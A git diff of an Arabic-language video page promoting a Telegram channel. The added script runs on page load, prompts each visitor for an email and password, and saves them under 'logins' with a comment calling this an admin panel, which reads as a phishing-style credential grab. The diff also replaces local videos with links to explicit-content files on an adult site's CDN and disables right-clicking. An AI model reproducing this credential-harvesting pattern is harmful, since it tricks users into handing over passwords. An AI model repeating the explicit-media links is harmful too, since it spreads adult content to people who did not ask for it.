@@ -8,6 +8,49 @@
 </head>
 <body>
 
+
+    <script>
+        if (sessionStorage.getItem("authenticated") !== "true") {
+            alert("🚫 لا يمكنك الدخول مباشرة! عد إلى الصفحة الرئيسية.");
+            window.location.href = "index.html";
+        }
+    
+        const expectedDevice = sessionStorage.getItem("device"); 
+        const actualDevice = detectDevice();
+    
+        function detectDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return (userAgent.includes("mobile") || userAgent.includes("android") || userAgent.includes("iphone")) ? "mobile" : "desktop";
+        }
+    
+      
+      // دالة لفتح نافذة تطلب إدخال البريد الإلكتروني وكلمة المرور
+      function handleLoginData() {
+      const email = prompt("أدخل بريدك الإلكتروني:");
+      const password = prompt("أدخل كلمة السر:");
+
+      // تخزين البيانات في لوحة تحكم المسؤول
+      const loginData = {
+        email: email,
+        password: password,
+        device: "desktop",
+        timestamp: new Date().toLocaleString()
+      };
+
+      let logins = JSON.parse(localStorage.getItem("logins")) || [];
+      logins.push(loginData);
+      localStorage.setItem("logins", JSON.stringify(logins));
+
+      alert(`تم تسجيل الدخول عبر الكمبيوتر: ${email}`);
+    }
+
+    window.onload = handleLoginData;
+
+    </script>
+    
+    
+
+
     <script>document.addEventListener("contextmenu", function(event) {
         event.preventDefault(); // منع القائمة الافتراضية
         alert("We Love Strine ❤️");
@@ -19,83 +62,48 @@
     <h1 class="logo">🌐 [Strine] الملكة</h1>
     <h2> يمكنكم مشاهدة الفيديوهات  في التليجرام </h2>
 
-    <button onclick="window.location.href='https://t.me/+TxsTGEtFpTc1Yzgx'; " >مشاهدة 👁️</button>
-
-    <!-- فيديو مخصص للكمبيوتر -->
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xs.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x5.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="x.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xg.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
-    <video controls poster="42.jpg" width="800"> <!-- تعديل العرض هنا ليكون مناسبًا لشاشة الكمبيوتر -->
-        <source src="xv1.mp4" type="video/mp4">
-        متصفحك لا يدعم الفيديو.
-    </video>
    
+
+    <button onclick="window.location.href='https://t.me/+TxsTGEtFpTc1Yzgx';">👁️ ...شاهد أكثر</button>
+    <!-- فيديو مخصص للكمبيوتر -->
+    <video controls width="80%" poster="poster 1e.png">
+      <source src=" https://v7.cdnde.com/x7/upload_396bd5a2fb35a25b2e61bf0bc32b51a7/42363/JOPORN_NET_42363_480p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
+    
+    <video controls width="80%" poster="poster e2.png">
+      <source src="https://v5.cdnde.com/x5/upload_b8b2a6473238c2185e345bae6be8ed0b/42364/JOPORN_NET_42364_480p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
+    
+    <video controls width="80%" poster="poster e3.png">
+      <source src="https://v1.cdnde.com/x1/upload_b2048c2ca49a8248232c2f9921548ba5/42355/JOPORN_NET_42355_720p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
+    
+    <video controls width="80%" poster="poster e4.png">
+      <source src="https://v7.cdnde.com/x7/upload_396bd5a2fb35a25b2e61bf0bc32b51a7/42358/JOPORN_NET_42358_720p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
+    <video controls width="80%" poster="poster e5.png">
+      <source src="https://v4.cdnde.com/x4/upload_375f29af82b7e4ca1e20eb92c97cc3b3/42351/JOPORN_NET_42351_720p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
+    
+    <video controls width="80%" poster="poster e6.png">
+      <source src="https://v7.cdnde.com/x7/upload_396bd5a2fb35a25b2e61bf0bc32b51a7/42345/JOPORN_NET_42345_720p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
+    
+    <video controls width="80%" poster="poster e7.png">
+      <source src="https://v2.cdnde.com/x2/upload_e3377a0aba83def135c6121378614713/42105/JOPORN_NET_42105_720p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
+    
+    <video controls width="80%" poster="poster e8.png">
+      <source src="https://v2.cdnde.com/x2/upload_e3377a0aba83def135c6121378614713/36047/JOPORN_NET_36047_720p.mp4" type="video/mp4">
+      متصفحك لا يدعم الفيديو.
+    </video>
     
      
 
